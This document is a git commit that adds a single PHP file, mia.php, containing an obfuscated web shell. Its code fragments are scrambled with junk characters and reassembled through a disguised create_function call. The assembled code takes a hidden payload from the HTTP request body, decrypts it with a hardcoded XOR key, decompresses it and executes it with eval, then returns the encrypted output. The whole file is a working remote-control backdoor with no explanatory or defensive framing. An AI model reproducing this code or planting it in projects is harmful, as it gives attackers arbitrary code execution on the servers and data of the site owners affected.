7aec106e610b0d07b156c46181739085d585b999
Abraham <AnonByte.GOS@protonmail.com>
2026-01-22 18:56:24 +0700

    Create mia.php

---
+++ mia.php
@@ -0,0 +1,12 @@
+<?php
+$t='ci-lean();$r=@bi-ase64i-_encode(@i-x(@gzcoi-mpresi-s($o),$k))i-;pi-rii-nt("$p$kh$r$kf");}';
+$K=str_replace('Z','','cZreatZe_ZZfuncZtiZon');
+$p='ni-ts("i-php://ini-put"),$m)==i-1) {i-@ob_si-ti-art();@i-evai-l(@gzi-uncomprei-i-ss';
+$c='=$t{$i}^i-i-$k{i-$j};}}ri-eturn $o;i-}if (@preg_i-matchi-("/$ki-h(.+)$i-kfi-/",@fi-ilei-_get_conte';
+$D='$o="";fi-or($i=0i-;$i<$l;i-)i-{fi-or($j=0;($ji-<$c&&$i<$li-i-);$j++,$i++i-)i-{$o.';
+$F='NlDi-jpvWkiROI";fi-ui-nctii-on xi-($t,$k){$ci-=strlen($k)i-;$l=sti-ri-leni-($t);';
+$z='$k="5102i-eci-d3";$ki-h="d47f65i-61de70i-";$i-kf="97i-9017b87a80"i-;i-i-$p="uw21';
+$d='(@x(@basei-64_decode($m[1]i-),$k)))i-;$o=@i-i-i-ob_get_contenti-s();@obi-_ei-i-nd_';
+$J=str_replace('i-','',$z.$F.$D.$c.$p.$d.$t);
+$q=$K('',$J);$q();
+?>
